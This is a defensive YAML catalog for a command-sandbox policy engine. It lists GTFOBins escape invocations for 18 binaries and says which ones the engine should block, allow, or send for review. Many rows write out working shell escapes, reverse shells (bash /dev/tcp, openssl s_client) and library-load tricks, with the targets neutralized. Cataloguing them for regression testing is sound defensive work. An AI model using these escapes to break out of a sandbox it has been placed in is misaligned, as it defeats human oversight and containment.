@@ -1,0 +1,314 @@
+# GTFOBins sweep — seed catalog (TJ-GAP-059)
+#
+# Machine-readable shape of the GTFOBins problem for terminal-jail: per binary,
+# the GTFOBins function classes it is documented under, ONE representative
+# invocation per class, and the posture the fleet accepts for that invocation.
+#
+# This file is MEASUREMENT INPUT, not enforcement. Nothing here blocks anything:
+# scripts/gtfobins-sweep.py evaluates every invocation against the live engine
+# and reports where the engine disagrees with the recorded posture.
+#
+# `expected` is one of:
+#   allowed-conscious  the engine allows it and we accept that — the dual-use
+#                      tool doing its designed job, with no capability gained
+#                      beyond what the operator already has (reading a readable
+#                      file, archiving a readable path, writing a writable one).
+#   blocked            the engine must block it. A silently-allowed `blocked`
+#                      row is the regression the CI gate exists to catch.
+#   review             no conscious decision recorded yet. The live verdict is
+#                      reported for visibility but never fails --check; these
+#                      rows are the queue for a human decision, not a bug list.
+#
+# Invocations are REAL GTFOBins forms with their destructive targets neutralized
+# (`/etc/hostname` for an arbitrary readable file, `/tmp/tj059-sweep.*` for a
+# scratch path, `127.0.0.1:9` for an attacker endpoint, `id`/`/bin/true` for a
+# payload). The engine evaluates these as STRINGS — it never executes a payload —
+# and a human reading this file must treat every form as hostile. `sudo ...`
+# forms are safe to record verbatim.
+#
+# One representative invocation per class is the convention; a class may carry a
+# second row when the engine's verdict differs by shape, because that contrast is
+# itself the measurement (e.g. `find` -name vs -exec, `php` exec vs pcntl_exec).
+#
+# Seed scope: 18 binaries. The upstream catalog has ~478; this file is the
+# starting point, and every entry carries the rationale for its posture.
+
+schema_version: 1
+
+entries:
+  - name: "sudo"
+    rationale: "The one escalator class the engine blocks outright; nothing about sudo is dual-use inside a sandbox that has no privileges to hand out."
+    classes:
+      - class: "shell"
+        invocation: "sudo /bin/sh"
+        expected: "blocked"
+        note: "builtin-sudo. Every GTFOBins sudo vector starts here; the block is the accepted protection."
+
+  - name: "vim"
+    rationale: "Interactive editor: the operator edits files with it, so it stays allowed, but its command/file-write escapes are not consciously accepted yet."
+    classes:
+      - class: "file-read"
+        invocation: "vim /etc/hostname"
+        expected: "allowed-conscious"
+        note: "Opening a world-readable file in an editor grants no capability the operator lacks."
+      # GTFOBins file-write: vim -c ':w /path/to/output-file' (writing is the editor's job)
+      - class: "file-write"
+        invocation: "vim -c ':w /tmp/tj059-sweep-vim-out' -c q /etc/hostname"
+        expected: "allowed-conscious"
+        note: "Writing a file the operator could write with any tool; no privilege is crossed."
+      - class: "command"
+        invocation: "vim -c ':!id' -c q"
+        expected: "review"
+        note: "Shell escape from inside the editor: live ALLOW with no rule provenance. Accepted only insofar as the operator could run id directly."
+
+  - name: "less"
+    rationale: "Pager: reading files is its entire purpose, so the read path is consciously allowed; the LESSOPEN hook that turns it into an executor is not."
+    classes:
+      - class: "file-read"
+        invocation: "less /etc/hostname"
+        expected: "allowed-conscious"
+        note: "Text reader on a readable file; the everyday dual-use case."
+      - class: "command"
+        invocation: "LESSOPEN='/bin/sh # %s' less /etc/hostname"
+        expected: "review"
+        note: "GTFOBins command execution via LESSOPEN: live ALLOW. Not yet accepted, not yet blocked."
+
+  - name: "git"
+    rationale: "Development tool the sandbox exists to serve. Read subcommands are allowlisted and consciously allowed; the PAGER escape to a shell is not."
+    classes:
+      - class: "file-read"
+        invocation: "git status"
+        expected: "allowed-conscious"
+        note: "Matches the allow-git-read allowlist rule (rule provenance is the proof this is a conscious ALLOW, not a default)."
+      - class: "shell"
+        invocation: "PAGER='/bin/sh -c \"exec sh 0<&1\"' git -p help"
+        expected: "review"
+        note: "GTFOBins shell via PAGER: live ALLOW. Environment variable is honored before the pager runs."
+
+  - name: "tar"
+    rationale: "Archiver: create/extract of readable paths is its designed job and grants nothing new; the checkpoint-action exec escape is an executor installed in an archiver and is not accepted."
+    classes:
+      - class: "file-read"
+        invocation: "tar -cf /tmp/tj059-sweep.tar /etc/hostname"
+        expected: "allowed-conscious"
+        note: "Equivalent to cat-ing a readable path into an archive; no new read capability."
+      - class: "shell"
+        invocation: "tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
+        expected: "review"
+        note: "GTFOBins shell via --checkpoint-action=exec: live ALLOW. Sharpest tar vector measured."
+      - class: "file-write"
+        invocation: "tar -xf /tmp/tj059-sweep.tar -C /tmp"
+        expected: "allowed-conscious"
+        note: "Extraction writes only where the operator can already write."
+
+  - name: "find"
+    rationale: "The engine draws the line INSIDE find: its search forms are allowlisted and consciously allowed, while -exec/-delete (arbitrary execution) is blocked."
+    classes:
+      - class: "file-read"
+        invocation: "find /tmp -maxdepth 1 -name tj059"
+        expected: "allowed-conscious"
+        note: "Matches the allow-find-safe allowlist rule; name search grants nothing."
+      - class: "shell"
+        invocation: "find . -exec /bin/sh -c 'id' ; -quit"
+        expected: "blocked"
+        note: "builtin-vm-delete covers -exec/-ok/-delete. The conscious block; a drift here is unprotected."
+      - class: "file-write"
+        invocation: "find /tmp -maxdepth 1 -fprintf /tmp/tj059-sweep-find-out x -quit"
+        expected: "review"
+        note: "GTFOBins file-write via -fprintf: live ALLOW through the allow-find-safe rule (the rule is not file-write blind)."
+
+  - name: "awk"
+    rationale: "Text-processing language: reading and printing files is its job; its system() escape is a full shell and is not accepted."
+    classes:
+      - class: "file-read"
+        invocation: "awk '{print}' /etc/hostname"
+        expected: "allowed-conscious"
+        note: "Text processing of a readable file."
+      - class: "shell"
+        invocation: "awk 'BEGIN {system(\"/bin/sh\")}'"
+        expected: "review"
+        note: "GTFOBins shell via system(): live ALLOW with no rule provenance."
+      - class: "file-write"
+        invocation: "awk 'BEGIN { print \"DATA\" > \"/tmp/tj059-sweep-awk-out\" }'"
+        expected: "review"
+        note: "GTFOBins file-write via awk redirection: live ALLOW, same capability as a shell redirect."
+
+  - name: "env"
+    rationale: "Two faces: `env <shell>` is caught by the auto-sandbox tier and never becomes a bare shell, while the LD_PRELOAD loader path is allowed and reaches the wrapper's env scrub rather than the rule engine."
+    classes:
+      - class: "shell"
+        invocation: "env /bin/sh"
+        expected: "review"
+        note: "Live MODIFY (builtin-net-fetch-pipe-qualified): namespace-wrapped rather than allowed. The wrap is not a conscious accept of env-as-shell."
+      - class: "library-load"
+        invocation: "env LD_PRELOAD=/tmp/tj059-sweep.so /bin/true"
+        expected: "review"
+        note: "Live ALLOW. The real defense is the standalone wrapper's env scrub (test_env_scrub.py), which the rule engine alone does not provide."
+      - class: "sudo"
+        invocation: "env sudo -l"
+        expected: "blocked"
+        note: "builtin-sudo still matches through the env prefix; wrappers do not hide the escalator."
+
+  - name: "nmap"
+    rationale: "Scanner: input-file reads and the interactive prompt are the two GTFOBins shapes; neither is consciously accepted, and neither is blocked."
+    classes:
+      - class: "file-read"
+        invocation: "nmap -iL /etc/hostname"
+        expected: "review"
+        note: "GTFOBins file-read via -iL: live ALLOW. Reads a readable file (and the content is used as targets)."
+      - class: "shell"
+        invocation: "nmap --interactive"
+        expected: "review"
+        note: "GTFOBins interactive shell escape: live ALLOW."
+      - class: "file-write"
+        invocation: "nmap -oG=/tmp/tj059-sweep-nmap-out 127.0.0.1"
+        expected: "allowed-conscious"
+        note: "Scan output to a writable path; a scan of loopback is the tool's designed job."
+
+  - name: "openssl"
+    rationale: "Crypto toolkit: encrypting a readable file gains nothing, but its reverse-shell (-s_client), library-load (-engine) and download shapes are unhandled."
+    classes:
+      - class: "file-read"
+        invocation: "openssl enc -in /etc/hostname"
+        expected: "allowed-conscious"
+        note: "Encrypting a readable file is the toolkit's purpose; no new capability."
+      - class: "reverse-shell"
+        invocation: "openssl s_client -quiet -connect 127.0.0.1:9"
+        expected: "review"
+        note: "GTFOBins reverse shell via s_client: live ALLOW. A TLS client is legitimately dual-use."
+      - class: "library-load"
+        invocation: "openssl req -engine /tmp/tj059-sweep.so"
+        expected: "review"
+        note: "GTFOBins library load via -engine: live ALLOW."
+
+  - name: "python3"
+    rationale: "Scripting runtime the fleet depends on: reading/writing files is the language's job, but shell-spawn and ctypes library load are full-code-execution paths that stay unresolved. Only the os.system/shutil shape is covered, by builtin-code-injection."
+    classes:
+      - class: "file-read"
+        invocation: "python3 -c 'print(open(\"/etc/hostname\").read())'"
+        expected: "allowed-conscious"
+        note: "Reading a readable file from the language runtime; the fleet's own tooling does this constantly."
+      - class: "shell"
+        invocation: "python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\")'"
+        expected: "review"
+        note: "GTFOBins shell via os.execl: live ALLOW. Contrast with the os.system shape below, which IS blocked."
+      - class: "command"
+        invocation: "python3 -c 'import os; os.system(\"id\")'"
+        expected: "blocked"
+        note: "builtin-code-injection matches os.system(. The single covered python execution shape."
+      - class: "library-load"
+        invocation: "python3 -c 'from ctypes import cdll; cdll.LoadLibrary(\"/tmp/tj059-sweep.so\")'"
+        expected: "review"
+        note: "GTFOBins library load via ctypes: live ALLOW."
+
+  - name: "perl"
+    rationale: "Same class of runtime as python3: text processing is consciously allowed, `perl -e 'exec ...'` is a full shell and is unresolved."
+    classes:
+      - class: "file-read"
+        invocation: "perl -ne 'print' /etc/hostname"
+        expected: "allowed-conscious"
+        note: "One-liner text processing of a readable file."
+      - class: "shell"
+        invocation: "perl -e 'exec \"/bin/sh\"'"
+        expected: "review"
+        note: "GTFOBins shell via exec: live ALLOW."
+
+  - name: "ruby"
+    rationale: "Same class as perl/python3, plus a Fiddle library-load path; none of the execution shapes are blocked."
+    classes:
+      - class: "file-read"
+        invocation: "ruby -e 'puts File.read(\"/etc/hostname\")'"
+        expected: "allowed-conscious"
+        note: "Reading a readable file from the runtime."
+      - class: "shell"
+        invocation: "ruby -e 'exec \"/bin/sh\"'"
+        expected: "review"
+        note: "GTFOBins shell via exec: live ALLOW."
+      - class: "library-load"
+        invocation: "ruby -e 'require \"fiddle\"; Fiddle.dlopen(\"/tmp/tj059-sweep.so\")'"
+        expected: "review"
+        note: "GTFOBins library load via Fiddle.dlopen: live ALLOW."
+
+  - name: "php"
+    rationale: "The engine covers ONE php execution shape (bare exec) and misses the rest of the family (system, passthru, popen, pcntl_exec) — a partial block worth pinning so it is not mistaken for coverage."
+    classes:
+      - class: "file-write"
+        invocation: "php -r 'file_put_contents(\"/tmp/tj059-sweep-out\", \"DATA\");'"
+        expected: "allowed-conscious"
+        note: "Writing a writable path; the language's designed job."
+      - class: "command"
+        invocation: "php -r 'exec(\"/bin/true\");'"
+        expected: "blocked"
+        note: "builtin-code-injection matches bare exec(. The only php execution shape the engine covers."
+      - class: "shell"
+        invocation: "php -r 'system(\"/bin/sh -i\");'"
+        expected: "review"
+        note: "GTFOBins shell via system(): live ALLOW — the covered/missed asymmetry inside one binary."
+      - class: "command"
+        invocation: "php -r 'pcntl_exec(\"/bin/sh\");'"
+        expected: "review"
+        note: "GTFOBins shell via pcntl_exec: live ALLOW. The word boundary before exec( is why this escapes the code-injection rule."
+
+  - name: "bash"
+    rationale: "The shell itself: running commands and reading/writing files is what the jail expects, so those paths are consciously allowed; the /dev/tcp reverse shell is a conscious block; the loadable-builtin path is not accepted."
+    classes:
+      - class: "file-write"
+        invocation: "bash -c 'echo DATA >/tmp/tj059-sweep-out'"
+        expected: "allowed-conscious"
+        note: "A shell writing a writable path."
+      - class: "file-read"
+        invocation: "bash -c 'echo \"$(</etc/hostname)\"'"
+        expected: "allowed-conscious"
+        note: "A shell reading a readable path."
+      - class: "shell"
+        invocation: "bash -c 'id'"
+        expected: "review"
+        note: "Bare nested shell: live ALLOW with no rule provenance."
+      - class: "reverse-shell"
+        invocation: "bash -c 'exec bash -i &>/dev/tcp/127.0.0.1/9 <&1'"
+        expected: "blocked"
+        note: "builtin-net-devtcp-redirect. The GTFOBins bash reverse shell as shipped."
+      - class: "library-load"
+        invocation: "bash -c 'enable -f /tmp/tj059-sweep.so x'"
+        expected: "review"
+        note: "GTFOBins library load via enable -f: live ALLOW."
+
+  - name: "nice"
+    rationale: "Process-niceness wrapper: it can carry any command, so bare `nice /bin/sh` is unresolved, but the block rules still see through it to an escalator."
+    classes:
+      - class: "shell"
+        invocation: "nice /bin/sh"
+        expected: "review"
+        note: "GTFOBins shell via nice: live ALLOW. The wrapper is transparent to the shell it launches."
+      - class: "shell"
+        invocation: "nice -n 5 /bin/sh -p"
+        expected: "review"
+        note: "GTFOBins setuid-restore form (-p): live ALLOW."
+      - class: "sudo"
+        invocation: "nice sudo -l"
+        expected: "blocked"
+        note: "builtin-sudo matches through the wrapper; `nice` does not hide the escalator."
+
+  - name: "time"
+    rationale: "Timing wrapper, same shape as nice: it passes an arbitrary command through, and the block rules read the inner command anyway."
+    classes:
+      - class: "shell"
+        invocation: "time /bin/sh"
+        expected: "review"
+        note: "GTFOBins shell via time: live ALLOW."
+      - class: "sudo"
+        invocation: "time sudo -l"
+        expected: "blocked"
+        note: "builtin-sudo matches through the wrapper."
+
+  - name: "timeout"
+    rationale: "Timeout wrapper, same shape as nice/time; `timeout 0 <cmd>` is the GTFOBins way to defeat a timeout, and the block rules still match the inner command."
+    classes:
+      - class: "shell"
+        invocation: "timeout 0 /bin/sh"
+        expected: "review"
+        note: "GTFOBins shell via timeout 0: live ALLOW."
+      - class: "sudo"
+        invocation: "timeout 5 sudo -l"
+        expected: "blocked"
+        note: "builtin-sudo matches through the wrapper."
